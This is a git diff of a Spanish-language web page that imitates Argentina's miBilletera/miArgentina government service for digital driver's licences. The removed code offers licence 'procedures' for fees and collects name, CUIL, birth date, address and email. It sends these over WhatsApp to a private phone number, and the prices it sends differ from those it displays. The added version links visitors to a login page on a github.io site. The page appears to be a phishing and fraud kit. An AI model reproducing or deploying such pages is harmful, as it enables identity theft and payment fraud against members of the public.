@@ -1,78 +1,122 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Licencia de conducir digital | Mi Billetera</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>miBilletera | miArgentina</title>
 
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
 
-  <style>
-    body { font-family: 'Encode Sans', sans-serif; margin: 0; }
-    .navbar { background: #fff; border-bottom: 3px solid #ffd100; padding: 10px 20px; }
-    .navbar img { height: 70px; }
-    .header { background: #0072bb; color: white; padding: 30px; }
-    .container { max-width: 900px; margin: auto; padding: 20px; }
+<style>
+body{
+  font-family:'Encode Sans',sans-serif;
+  margin:0;
+  background:#f7f7f7;
+  color:#222;
+}
 
-    .btn-licencia {
-      background-color: #0072bb;
-      color: white;
-      border-radius: 25px;
-      padding: 12px 30px;
-      font-weight: 600;
-      text-transform: uppercase;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 20px;
-      border: none;
-      cursor: pointer;
-    }
+.navbar{
+  background:#fff;
+  border-bottom:3px solid #ffd100;
+  padding:10px 20px;
+}
 
-    .btn-licencia:disabled {
-      background-color: #999;
-      cursor: not-allowed;
-    }
+.navbar img{
+  height:70px;
+}
 
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 5px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
+.header{
+  background:#0072bb;
+  color:#fff;
+  padding:40px 25px;
+  text-align:center;
+}
 
-    .error {
-      color: red;
-      font-size: 13px;
-      margin-bottom: 10px;
-      display: none;
-    }
+.header h1{
+  margin:0 0 10px 0;
+  font-size:34px;
+}
 
-    .titulo-licencia{
-      text-align:center;
-      font-size:18px;
-      font-weight:700;
-      color:#0072bb;
-      margin:25px 0 10px 0;
-      text-transform:uppercase;
-    }
+.header p{
+  margin:0;
+  font-size:18px;
+}
 
-    .img-licencia{
-      width:100%;
-      border-radius:14px;
-      overflow:hidden;
-      display:block;
-    }
+.container{
+  max-width:950px;
+  margin:auto;
+  padding:25px;
+}
 
-    .aclaracion{
-      background:#f5f5f5;
-      padding:15px;
-      border-radius:10px;
-      margin-top:15px;
-      font-size:14px;
-      line-height:1.5;
-    }
-  </style>
+.card{
+  background:#fff;
+  border-radius:16px;
+  padding:25px;
+  margin-bottom:20px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.08);
+}
+
+.card h2{
+  margin-top:0;
+  color:#0072bb;
+}
+
+.btn{
+  display:inline-block;
+  padding:14px 28px;
+  border-radius:30px;
+  text-decoration:none;
+  font-weight:700;
+  text-transform:uppercase;
+  margin:8px 5px 0 0;
+  transition:0.2s;
+}
+
+.btn-principal{
+  background:#0072bb;
+  color:#fff;
+}
+
+.btn-secundario{
+  background:#00a650;
+  color:#fff;
+}
+
+.btn:hover{
+  transform:translateY(-2px);
+}
+
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:20px;
+}
+
+.info{
+  background:#eef6fc;
+  border-left:5px solid #0072bb;
+  padding:15px;
+  border-radius:10px;
+  margin-top:15px;
+}
+
+footer{
+  background:#f1f1f1;
+  padding:30px;
+  margin-top:40px;
+  text-align:center;
+  font-size:14px;
+}
+
+footer p{
+  margin:6px 0;
+}
+
+.small{
+  font-size:12px;
+  color:#666;
+}
+</style>
 </head>
 
 <body>
@@ -82,209 +126,72 @@
 </div>
 
 <div class="header">
-  <h1>Licencia de conducir digital</h1>
-  <p>La versión digital de tu licencia ya está disponible en Mi Billetera.</p>
+  <h1>miBilletera | miArgentina</h1>
+  <p>Toda tu documentación digital en un solo lugar.</p>
 </div>
 
 <div class="container">
-  <h2>Nueva licencia nacional de conducir digital</h2>
-  <p>A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital.</p>
 
-  <div class="titulo-licencia">LICENCIA FRENTE</div>
-  <img src="https://i.postimg.cc/2ydqP5HM/IMG-20260419-WA0003.jpg" class="img-licencia">
+  <div class="card">
+    <h2>Accedé a tus documentos digitales</h2>
+    <p>
+      En la app <strong>miBilletera de miArgentina</strong> podés visualizar, consultar y gestionar tu documentación personal en formato digital de forma rápida, simple y segura.
+    </p>
 
-  <div class="titulo-licencia">LICENCIA DORSO</div>
-  <img src="https://i.postimg.cc/YSRdhmgT/IMG-20260417-WA0000.jpg" class="img-licencia">
-
-  <div style="text-align:center;">
-    <a href="https://mibilletera-servicios.github.io/licencia/login.html" class="btn-licencia">Ver Licencia Digital</a>
+    <div class="info">
+      Desde esta plataforma podrás obtener información sobre:
+      <br>✔ Licencia Nacional de Conducir
+      <br>✔ Títulos Académicos
+      <br>✔ Analíticos y Constancias Educativas
+    </div>
   </div>
 
-  <h2>Formulario de inicio de trámite</h2>
+  <div class="grid">
 
-  <select id="tramite" onchange="mostrarCampos(); validarFormulario();" required>
-    <option value="">Seleccionar trámite</option>
-    <option value="particular">Obtener licencia particular $280.000</option>
-    <option value="profesional">Obtener licencia profesional $380.000</option>
-    <option value="robo">Renovación por robo / extravío $200.000</option>
-    <option value="vencimiento">Renovación por vencimiento $250.000</option>
-  </select>
+    <div class="card">
+      <h2>Licencia Nacional de Conducir</h2>
+      <p>
+        Consultá cómo obtener tu licencia digital, nuevas emisiones, renovaciones y categorías habilitadas.
+      </p>
 
-  <form id="formulario" oninput="validarFormulario()" onsubmit="enviarWhatsApp(event)" style="display:none;">
+      <a href="https://mibilletera-servicios.github.io/licencia/login.html" class="btn btn-principal">
+        Ir a Licencia
+      </a>
+    </div>
 
-    <input type="text" id="nombre" placeholder="Nombre" required>
-    <input type="text" id="apellido" placeholder="Apellido" required>
+    <div class="card">
+      <h2>Títulos Académicos</h2>
+      <p>
+        Informate sobre cómo solicitar títulos, analíticos, certificados y documentación educativa digital.
+      </p>
 
-    <input type="email" id="email" placeholder="Correo electrónico (ej: ejemplo@gmail.com)" required>
-    <div id="errorEmail" class="error">Email inválido</div>
+      <a href="https://mibilletera-servicios.github.io/licencia/titulos.html" class="btn btn-secundario">
+        Ir a Títulos
+      </a>
+    </div>
 
-    <input type="text" id="fecha" placeholder="Fecha de nacimiento (Ej: 15/03/1990)" required>
+  </div>
 
-    <input type="text" id="cuil" placeholder="CUIL (Ej: 20-12345678-3)" required>
-    <div id="errorCuil" class="error">CUIL inválido</div>
-
-    <input type="text" id="provincia" placeholder="Provincia" required>
-    <input type="text" id="localidad" placeholder="Localidad" required>
-    <input type="text" id="direccion" placeholder="Dirección del domicilio" required>
-
-    <select id="categoria" style="display:none;">
-      <option value="">Seleccionar categoría</option>
-    </select>
-
-    <div class="aclaracion">
-  <strong>Aclaración:</strong><br><br>
-
-  Deberá enviar una fotografía tipo DNI, con fondo claro y encuadre hasta la altura de los hombros. 
-  La imagen debe tomarse sin lentes ni gorras. En caso de tener cabello largo, este no deberá cubrir ninguna parte del rostro.
-  
-  <br><br>
-
-  El pago de la licencia se realiza una vez finalizado el trámite.
-</div>
-
-    <button id="btnEnviar" class="btn-licencia" disabled>Enviar solicitud</button>
-
-  </form>
-
-</div>
-
-<footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
-  <div class="container" style="text-align:center;">
-    <p><strong>miBilletera | Documentación Digital</strong></p>
-    <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
-    <p style="margin-top:20px; font-size:12px; color:#666;">
-      © 2026 miBilletera | miArgentina.<br>
-      Todos los derechos reservados.
+  <div class="card">
+    <h2>Beneficios de miBilletera</h2>
+    <p>
+      ✔ Acceso inmediato desde tu celular.<br>
+      ✔ Documentación digital disponible las 24 hs.<br>
+      ✔ Trámites ágiles y simples.<br>
+      ✔ Plataforma moderna y segura.
     </p>
   </div>
+
+</div>
+
+<footer>
+  <p><strong>miBilletera | Documentación Digital</strong></p>
+  <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
+  <p class="small">
+    © 2026 miBilletera | miArgentina.<br>
+    Todos los derechos reservados.
+  </p>
 </footer>
 
-<script>
-function mostrarCampos(){
-  let tipo = document.getElementById("tramite").value;
-  let categoria = document.getElementById("categoria");
-
-  document.getElementById("formulario").style.display = "block";
-  categoria.style.display = "none";
-  categoria.innerHTML = '<option value="">Seleccionar categoría</option>';
-
-  if(tipo === "particular" || tipo === "robo" || tipo === "vencimiento"){
-    categoria.style.display = "block";
-    categoria.innerHTML += `
-      <option>A - Motos</option>
-      <option>B1 - Autos particulares</option>
-      <option>B2 - Camionetas / utilitarios</option>
-      <option>G - Maquinaria agrícola</option>
-    `;
-  }
-
-  if(tipo === "profesional"){
-    categoria.style.display = "block";
-    categoria.innerHTML += `
-      <option>D1 - Transporte de pasajeros hasta 8 plazas</option>
-      <option>D2 - Transporte de pasajeros de más de 8 plazas</option>
-      <option>D3 - Emergencia / seguridad / maquinaria especial</option>
-      <option>E1 - Camiones con acoplado / semirremolque</option>
-      <option>E2 - Maquinaria especial no agrícola</option>
-      <option>C - Camiones sin acoplado de gran porte</option>
-    `;
-  }
-}
-
-document.getElementById("cuil").addEventListener("input", function(e){
-  let valor = e.target.value.replace(/\D/g, "").substring(0,11);
-
-  if(valor.length > 2 && valor.length <= 10){
-    valor = valor.slice(0,2) + "-" + valor.slice(2);
-  } else if(valor.length > 10){
-    valor = valor.slice(0,2) + "-" + valor.slice(2,10) + "-" + valor.slice(10);
-  }
-
-  e.target.value = valor;
-});
-
-function validarCUIL(cuil){
-  return /^\d{2}-\d{8}-\d{1}$/.test(cuil);
-}
-
-function validarEmail(email){
-  return /^[^\s@]+@[^\s@]+\.(com|com\.ar|net|org|ar)$/i.test(email);
-}
-
-function validarFormulario(){
-  let tipo = document.getElementById("tramite").value;
-  let nombre = document.getElementById("nombre").value;
-  let apellido = document.getElementById("apellido").value;
-  let email = document.getElementById("email").value;
-  let fecha = document.getElementById("fecha").value;
-  let cuil = document.getElementById("cuil").value;
-  let provincia = document.getElementById("provincia").value;
-  let localidad = document.getElementById("localidad").value;
-  let direccion = document.getElementById("direccion").value;
-  let categoria = document.getElementById("categoria").value;
-
-  let cuilValido = validarCUIL(cuil);
-  let emailValido = validarEmail(email);
-
-  document.getElementById("errorCuil").style.display = cuil && !cuilValido ? "block" : "none";
-  document.getElementById("errorEmail").style.display = email && !emailValido ? "block" : "none";
-
-  let valido = nombre && apellido && emailValido && fecha && cuilValido && provincia && localidad && direccion && tipo;
-
-  if(document.getElementById("categoria").style.display === "block"){
-    valido = valido && categoria;
-  }
-
-  document.getElementById("btnEnviar").disabled = !valido;
-}
-
-function enviarWhatsApp(e){
-  e.preventDefault();
-
-  let tipo = document.getElementById("tramite").value;
-  let nombre = document.getElementById("nombre").value;
-  let apellido = document.getElementById("apellido").value;
-  let email = document.getElementById("email").value;
-  let fecha = document.getElementById("fecha").value;
-  let cuil = document.getElementById("cuil").value;
-  let provincia = document.getElementById("provincia").value;
-  let localidad = document.getElementById("localidad").value;
-  let direccion = document.getElementById("direccion").value;
-  let categoria = document.getElementById("categoria").value;
-
-  let tipoTexto = "";
-  let precio = "";
-
-  if(tipo==="particular"){ tipoTexto="Obtener licencia particular"; precio="$280.000"; }
-  if(tipo==="profesional"){ tipoTexto="Obtener licencia profesional"; precio="$380.000"; }
-  if(tipo==="robo"){ tipoTexto="Renovación por robo / extravío"; precio="$180.000"; }
-
-if(tipo==="vencimiento"){
-  tipoTexto="Renovación por vencimiento";
-  precio="$220.000";
-  }
-
-  let mensaje =
-`*SOLICITUD DE LICENCIA*
-
-📌 Tipo de trámite: ${tipoTexto}
-
-👤 Nombre: ${nombre}
-👤 Apellido: ${apellido}
-📧 Email: ${email}
-🎂 Fecha de nacimiento: ${fecha}
-🆔 CUIL: ${cuil}
-📍 Provincia: ${provincia}
-🏙️ Localidad: ${localidad}
-🏠 Dirección: ${direccion}
-🚗 Categoría: ${categoria}
-
-💰 Precio: ${precio}`;
-
-  let url = "https://wa.me/5491131602393?text=" + encodeURIComponent(mensaje);
-  window.open(url, "_blank");
-}
-</script>
-
 </body>
-  </html>
+</html>
